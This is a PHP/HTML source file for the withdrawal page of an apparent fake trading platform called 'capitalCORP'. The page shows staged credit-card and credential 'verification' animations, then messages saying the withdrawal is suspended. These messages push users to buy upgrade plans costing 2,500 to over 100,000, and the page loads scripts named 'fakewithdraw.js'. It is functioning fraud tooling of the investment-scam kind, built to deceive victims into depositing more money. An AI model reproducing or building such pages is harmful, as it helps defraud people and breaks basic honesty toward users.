<?php 
session_start();

include("connection.php");
include("functions.php");

$user_data = check_login($con);
?>

<!DOCTYPE html>
<html>
  <head>
    <title>capitalCORP</title>
        <!-- FAVIVON -->
        <link rel="shortcut icon" href="images/favicon.png" type="image/png">
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="preconnect" href="https://fonts.gstatic.com">
        <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
	      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

        <link rel="stylesheet" href="csss/innertto.css" />
        <link rel="stylesheet" href="csss/aos.cs" />
          <link rel="stylesheet" href="csss/stylle.css">
    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <style>
      body{
        color:#ddd;
      }
    #spin{
  font-size: 70px;color: #000;text-align:center;
}

 
@media(max-width: 500px){
  body{
    display: block;
    height:320vh;
  }
  #myDiv {
  margin-top: 100px;
}
#myDiv2 {
  margin-top: 90px;
}
#myDiv3 {
  margin-top: 90px;
}
}
@media(max-width: 430px){
  #myDiv {
  margin-top: 150px;
}
}
  
p{
  text-align: center;
  font-weight: 900;
}
input{
  width: 50%;
  height:30px;
  border: 1px solid #000;
}
button{
  width: 50%;
  height:30px;
  padding-bottom:30px;
  border: 3px solid #042c47;
  border-radius: 3px;
  color: #c7d3db;
  background-color: #042c47;
}
  #loader {
  position: absolute;
  display:none;
  left: 50%;
  top: 50%;
  z-index: 1;
  width: 120px;
  height: 120px;
  margin: -76px 0 0 -76px;
  border: 16px solid #f3f3f3;
  border-radius: 50%;
  border-top: 16px solid #043126;
  -webkit-animation: spin 2s linear infinite;
  animation: spin 2s linear infinite;
}

@-webkit-keyframes spin {
  0% { -webkit-transform: rotate(0deg); }
  100% { -webkit-transform: rotate(360deg); }
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

/* Add animation to "page content" */
.animate-bottom {
  position: relative;
  -webkit-animation-name: animatebottom;
  -webkit-animation-duration: 1s;
  animation-name: animatebottom;
  animation-duration: 1s
}

@-webkit-keyframes animatebottom {
  from { bottom:-100px; opacity:0 } 
  to { bottom:0px; opacity:1 }
}

@keyframes animatebottom { 
  from{ bottom:-100px; opacity:0 } 
  to{ bottom:0; opacity:1 }
}

#myDiv {
  display: none;
  text-align: center;
}






#currency-container {
  display:grid;
  margin-left:30px;
  grid-template-columns:repeat(4,1fr);
  grid-gap:20px;
}
@media (max-width:1200px){
  #currency-container {
    grid-template-columns:repeat(3,1fr);
    grid-gap:20px;
  }
}
@media (max-width:900px){
  #currency-container {
    grid-template-columns:repeat(2,1fr);
    grid-gap:20px;
  }
}
@media (max-width:600px){
  #currency-container {
    margin-left:0px;
    grid-template-columns:repeat(1,1fr);
    grid-gap:20px;
  }
}
#currency-container ul{
  color:#ddd;
  width:90%;
  background:#111111;
  padding:25px 10px;
  height:100%;
  border-radius:0px;
  text-align: center;
  font-weight: 800;
  font-size: 12px;  
  z-index: 10; 
}
@media (max-width:450px){
  #currency-container ul{
  width:95%;
}
}
@media (max-width:415px){
  #currency-container ul{
  width:95%;
}
}
#currency-container a{
  float:left; 
  font-weight:800;
  padding:7px 20px;
  background: radial-gradient(circle at top left, #4f42a1, #9e4588, #e06c7f, #e2098f);
  color:#000;
  border:3px solid #9e4588;
  border-radius:7px;  
}
#currency-container h3{
  font-weight:800;
}
.currency {
  position: absolute;
  top: -50px;
  font-size: 24px;
  color: #E0AA3E;
  font-weight: 900;
  animation: fall linear infinite;
}

@keyframes fall {
  0% {
    transform: translateY(0);
    opacity: 1;
  }
  100% {
    transform: translateY(600px);
    opacity: 0;
  }
}
.vcc{
  display:block;
}
.cmc{
  display:none;
}
.pyw{
  display:none;
}
.vcca{
  display:block;
}
.cmca{
  display:none;
}
.pywa{
  display:none;
}


    </style>
  </head>
  <body>
    <header style="float: ;">&nbsp;&nbsp;
      <ul style="margin-top:0px;">
        <a href=""><h4 style="font-weight: 800;color:#ccccccf1;float: left;">capital<span style="background: linear-gradient(to right, #402bca,
                                      #d625aa, #c77f3d, #d44c63); -webkit-text-fill-color: transparent; -webkit-background-clip: text;font-weight: 800;">CORP</span></h4></a>
      </ul>
      <ul style="float: right;margin-top:-30px;">
    <i class="fa fa-wifi" style="font-size:15px;font-weight:800;color:#ffffff;"></i>  &nbsp;&nbsp;&nbsp;&nbsp;
      <a href=""><?php echo $user_data['user_name']; ?></a>&nbsp;&nbsp;&nbsp;&nbsp;
      <a href="logout.php"><i class="fa fa-sign-out" style="font-size:15px;font-weight:800;color:red;"></i></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
      </ul>
  </header>
         
          
  <div class="wrapper">
    <div id="wrap" class="wrap">
          
           <small id="google_translate_element" style="margin-top:0px;"></small>
          
          
      <h3 style="">WELCOME::&nbsp;&nbsp;<?php echo $user_data['user_name']; ?></h3>

       <!-- TradingView Widget BEGIN -->
<div class="tradingview-widget-container">
  <div class="tradingview-widget-container__widget"></div>
  <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-ticker-tape.js" async>
  {
  "symbols": [
    {
      "proName": "FOREXCOM:SPXUSD",
      "title": "S&P 500 Index"
    },
    {
      "proName": "FOREXCOM:NSXUSD",
      "title": "US 100 Cash CFD"
    },
    {
      "proName": "FX_IDC:EURUSD",
      "title": "EUR to USD"
    },
    {
      "proName": "BITSTAMP:BTCUSD",
      "title": "Bitcoin"
    },
    {
      "proName": "BITSTAMP:ETHUSD",
      "title": "Ethereum"
    }
  ],
  "showSymbolLogo": true,
  "isTransparent": true,
  "displayMode": "adaptive",
  "colorTheme": "dark",
  "locale": "en"
}
  </script>
</div>
<!-- TradingView Widget END -->

<div class="info">
  <ul data-aos="fade-down">

    <h5><?php echo $user_data['currency_type']; ?>&nbsp;<small style="font-size:16px;font-weight: 800;color:#fff;"><?php echo $user_data['deposited']; ?></small></h5>
    <i class="fas fa-chart-line" style="float:right;"></i>
    <br><br>
      <p style="color:#666;font-weight: 800;">DEPOSITED</p>
  </ul>
  <ul data-aos="fade-down">
    <h5><?php echo $user_data['currency_type']; ?>&nbsp;<small style="font-size:16px;font-weight: 800;color:#fff;"><?php echo $user_data['total_balance']; ?></small></h5>
    <i class="fas fa-chart-line" style="float:right;"></i>
    <br><br>
      <p style="color:#666;font-weight: 800;">T.BALANCE</p>
  </ul>
  <ul data-aos="fade-down">
    <h5><?php echo $user_data['currency_type']; ?>&nbsp;<small style="font-size:16px;font-weight: 800;color:#fff;"><?php echo $user_data['bonus']; ?></small></h5>
    <i class="fas fa-chart-line" style="float:right;"></i>
    <br><br>
      <p style="color:#666;font-weight: 800;">BONUS</p>
  </ul>
  <ul data-aos="fade-down">
    <h5><?php echo $user_data['currency_type']; ?>&nbsp;<small style="font-size:16px;font-weight: 800;color:#fff;"><?php echo $user_data['total_profit']; ?></small></h5>
    <i class="fas fa-chart-line" style="float:right;"></i>
    <br><br>
      <p style="color:#666;font-weight: 800;">TOTAL PROFIT</p>
  </ul>
  </div>
 
   
  






<div id="loader"></div>

    <div style="display:none;margin-top:20px;" id="myDiv" class="animate-bottom">
    <div style="color:#ddd;font-weight:800;" class="vcc" id="vcc">CHECKING YOUR CREDIT CARD <BR><BR><p id="30" style="display: block;">30% COMPLETE..</p><p id="50" style="display: none;">50% COMPLETE...</p><p id="73" style="display: none;">73% COMPLETE.....</p><p id="97" style="display: none;">97% COMPLETE.....</p></div> 
      <div style="color:#ddd;font-weight:800;"class="cmc" id="cmc">VERIFYING YOUR MATCHING CREDENTIALS ......... <BR><BR><p id="300" style="display: block;">30% COMPLETE..</p><p id="500" style="display: none;">50% COMPLETE...</p><p id="730" style="display: none;">73% COMPLETE.....</p><p id="970" style="display: none;">97% COMPLETE.....</p></div> 
        <div style="color:#ddd;font-weight:800;" class="pyw" id="pyw">PROCESSING YOUR WITHDRAWAL ...<BR><BR><p id="3000" style="display: block;">30% COMPLETE..</p><p id="5000" style="display: none;">50% COMPLETE...</p><p id="7300" style="display: none;">73% COMPLETE.....</p><p id="9700" style="display: none;">97% COMPLETE.....</p></div>   
    </div>
    
    <!----SUSPEND WITHDRAWAL BILLING---->
    
    <div style="display:none;margin-top:-10px;" id="myDiv1" class="animate-bottom">
      <p style=""><img src="imgg/glyph_alert_critical_big-2x.png" style="width:50px;"><br><br><span style="color: red;">FAILED....</span><br><br>WITHDRAWAL HAS BEEN SUSPENDED<br><br><span>THIS IS DUE TO LOW TRADING SET CYCLE ON A STARTER PLAN..</span><br><br><span>You ought to have made 5 concecutive trade cycles in other to be eligible for withdrawal on a starter plan ....
        </span><br><br><button type="submit" style="width:90%;"><a href="signalupgrade.php">GET TRADE SIGNAL</a></button></p>
      </div>
      
<!------UPGRADE WITHDRAWAL BILLING----->
    <div style="display:none;margin-top:-10px;" id="myDiv2" class="animate-bottom">
      <p style=""><img src="imgg/glyph_alert_critical_big-2x.png" style="width:50px;"><br><br><span style="color: red;">FAILED....</span><br><br>WITHDRAWAL HAS BEEN SUSPENDED<br><br><span>THIS IS BECAUSE YOUR CURRENT AVAILABLE BALANCE HAS EXCEDEED WITHDRAWALS YOU COULD MAKE ON A STARTER PLAN..</span><br><br><span>upgrade your account to make withdrawals with ease....
        </span><br><br><button type="submit" style="width:90%;" onclick="activatewallet();">PROCEED TO UPGRADE</button></p>
      </div>
      
      
   
      
      
      <!------DISBURSING WITHDRAWAL----->     
          
    <div style="display:none;margin-top:30px;text-align:center;" id="myDiv3" class="animate-bottom">
    <div style="color:greenyellow;font-weight:800;" class="vcca" id="vcca">PROCESSING WITHDRAWAL<BR><BR><p id="30a" style="display: block;">30% COMPLETE..</p><p id="50a" style="display: none;">50% COMPLETE...</p><p id="73a" style="display: none;">73% COMPLETE.....</p><p id="97a" style="display: none;">97% COMPLETE.....</p></div> 
      <div style="color:greenyellow;font-weight:800;"class="cmca" id="cmca">VERIFYING YOUR WITHDRAWAL CREDENTIALS ......... <BR><BR><p id="300a" style="display: block;">30% COMPLETE..</p><p id="500a" style="display: none;">50% COMPLETE...</p><p id="730a" style="display: none;">73% COMPLETE.....</p><p id="970a" style="display: none;">97% COMPLETE.....</p></div> 
        <div style="color:greenyellow;font-weight:800;" class="pywa" id="pywa">REVIEWING DETAILS ...<BR><BR><p id="3000a" style="display: block;">30% COMPLETE..</p><p id="5000a" style="display: none;">50% COMPLETE...</p><p id="7300a" style="display: none;">73% COMPLETE.....</p><p id="9700a" style="display: none;">97% COMPLETE.....</p></div> 
    
    </div>
    
    <div id="myDiv3a" style="display:none;margin-top:30px;" class="animate-bottom">
    <p style="color: #ddd;">CHECKING AMOUNT.............</p>
    </div>
    
    <div class="animate-bottom" id="myDiv3b" style="display:none;margin-top:30px;">
    <p style="color:yellowgreen;">
    <i class="fas fa-check" style="font-size:45px; font-weight:700; background:greenyellow; color:#000;padding:17px 20px;border-radius:55px;"></i><br><br>
    WITHDRAWAL HAS BEEN AUTHORISED<br><br><span style="color:#ddd;">FILL IN HOW MUCH WITHDRAWAL YOU NEED..</span></p><br><br><input type="text" placeholder="Fill your withdrawal amount" style="width:90%;color:#000;"><br><br><button type="submit" style="width:90%;" onclick="triggerfinalwithdraw();">COMPLETE WITHDRAW</button>
      </div>
      
      
      <div style="display:none;margin-top:30px;" id="myDiv3c" class="animate-bottom">
      <p style=""><i class="fas fa-check" style="font-size:45px; font-weight:700; background:greenyellow; color:#000;padding:17px 20px;border-radius:55px;"></i><br><br><span style="color: greenyellow;">FINALIZING WITHDRAWAL REQUEST....</span><br><br>WITHDRAWAL HAS BEEN COMPILLED & YOUR TRANSACTION IS IN QUEUE<br><br><span style="color:#ddd;">YOUR CURRENT WITHDRAWAL WOULD BE DISBURSED TO YOUR CHECKING BANK ACCOUNT OR PAYPAL WALLET IN MENIAL INTERVAL.</span><br><br><span style="color:#ddd;">kindly note that our teams would reach out to you for any further informations .....THANK YOU ....
        </span><br><br><button type="submit" style="width:90%;"><a href="dashboard.php">RETURN TO DASHBOARD</a></button></p>
      </div>
      
      
     <!--------UPGRADE PLAN--------> 
      

      <div style="display:none;margin-top:-10px;" id="myDiv4" class="animate-bottom">
      
        <h5 style="color:yellowgreen;text-align: center;font-weight:800;">UPGRADE FROM THE FOLLOWING SELECTED LIST'S TO MAKE AN EASY WITHDRAWAL....</h5>
  <br>


  <div class="container6">
    <div id="currency-container">
    <ul data-aos="fade-up">
      <a href="finalwithdrawn.php">PURCHASE</a>
      <br><br><br>
        <h5 style="color:#666;font-weight: 800;">PLAN B</h5>
        <h6 style="color:#f0414f;font-weight: 800;">PREMIUM PLAN</h6>
        <h2 style="background: linear-gradient(to right, #402bca,
                                      #d625aa, #c77f3d, #d44c63); -webkit-text-fill-color: transparent; -webkit-background-clip: text;font-weight: 800;">50%</h2>
        <p style="">&#10060; PROFESSIONAL SIGNALS</p>
        <p style="">&#10060; SIGNALS ANALYSIS</p>
        <p style="">&#9989; 10% REFERRAL BONUS</p>
        <p style="">&#9989; 24/7 SUPPORT</p>
        <br>
        <p style="">MINIMIUM 2,500</p>
        <p style="">MAXIMIUM 10,000</p>
    </ul>
       <ul data-aos="fade-down">
        <a href="finalwithdrawn.php">PURCHASE</a>
        <br><br><br>
        <h5 style="color:#666;font-weight: 800;">PLAN C</h5>
        <h6 style="color:#f0414f;font-weight: 800;">DELUXE PLAN</h6>
        <h2 style="background: linear-gradient(to right, #402bca,
                                      #d625aa, #c77f3d, #d44c63); -webkit-text-fill-color: transparent; -webkit-background-clip: text;font-weight: 800;">70%</h2>
        <p style="">&#9989; PROFESSIONAL SIGNALS</p>
          <p style="">&#9989; SIGNALS ANALYSIS</p>
          <p style="">&#9989; 50% REFERRAL BONUS</p>
          <p style="">&#9989; 24/7 SUPPORT</p>
          <br>
          <p style="">MINIMIUM 10,000</p>
          <p style="">MAXIMIUM 50,000</p>
      </ul>
      <ul>
      <a href="finalwithdrawn.php">PURCHASE</a>
      <br><br><br>
      <h5 style="color:#666;font-weight: 800;">PLAN C +</h5>
      <h6 style="color:#f0414f;font-weight: 800;">DELUXE PRO PLAN</h6>
      <h2 style="background: linear-gradient(to right, #402bca,
                                    #d625aa, #c77f3d, #d44c63); -webkit-text-fill-color: transparent; -webkit-background-clip: text;font-weight: 800;">85%</h2>
      <p style="">&#9989; PROFESSIONAL SIGNALS</p>
        <p style="">&#9989; SIGNALS ANALYSIS</p>
        <p style="">&#9989; 80% REFERRAL BONUS</p>
        <p style="">&#9989; 24/7 SUPPORT</p>
        <br>
        <p style="">MINIMIUM 30,000</p>
        <p style="">MAXIMIUM 100,000</p>
    </ul>
    <ul data-aos="fade-up">
      <a href="finalwithdrawn.php">PURCHASE</a>
      <br><br><br>
      <h5 style="color:#666;font-weight: 800;">PLAN D</h5>
      <h6 style="color:#f0414f;font-weight: 800;">EXCLUSIVE PLAN</h6>
      <h2 style="background: linear-gradient(to right, #402bca,
                                    #d625aa, #c77f3d, #d44c63); -webkit-text-fill-color: transparent; -webkit-background-clip: text;font-weight: 800;">85%</h2>
      <p style="">&#9989; PROFESSIONAL SIGNALS</p>
        <p style="">&#9989; SIGNALS ANALYSIS</p>
        <p style="">&#9989; 90% REFERRAL BONUS</p>
        <p style="">&#9989; 24/7 SUPPORT</p>
        <br>
        <p style="">MINIMIUM 100,000</p>
        <p style="">UPWARD</p>
    </ul>
    </div>
        </div>
      
      </div>
          
         






 <footer class="footer">
  <ul style="">
    <a href="dashboard.php" style=""><i class="fa fa-home"><p style="font-weight: 800;">HOME</p></i></a>&nbsp;&nbsp;&nbsp;
    <a href="deposit.php" style=""><i class="fa fa-wallet"><p style="font-weight: 800;">WALLET</p></i></a>&nbsp;&nbsp;&nbsp;
    <a href="upgradeplan.php" style=""><i class="fas fa-chart-line"><p style="font-weight: 800;">UPGRADE PLAN</p></i></a>&nbsp;&nbsp;&nbsp;
    <a href="" style=""><i class="fas fa-award"><p style="font-weight: 800;">REWARD</p></i></a>&nbsp;&nbsp;&nbsp;
    <a href="profile.php" style=""><i class="fas fa-user-circle"><p style="font-weight: 800;">ACCOUNT</p></i></a>&nbsp;&nbsp;&nbsp;
  </ul>
</footer>


  </div>
    

  <script type="text/javascript">
    function googleTranslateElementInit() {
      new google.translate.TranslateElement(
        {pageLanguage: 'en'}, 
        'google_translate_element'
      );
    }
  </script>
  
  <script type="text/javascript" 
    src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit">
  </script>

<script>

          
    </script>
    <script src="TRADEFORWITHDRAW/fakewithdraw1.js"></script>
     <script src="UPGRADEFORWITHDRAW/fakewithdraw.js"></script>
     <script src="DISBURSINGWITHDRAWAL/fakewithdraw.js"></script>
<script src="jss/aos.js"></script>
<script src="jss/snow.js"></script>
<script src="jss/rainingcfd.js"></script>
  </body>
</html>

        

  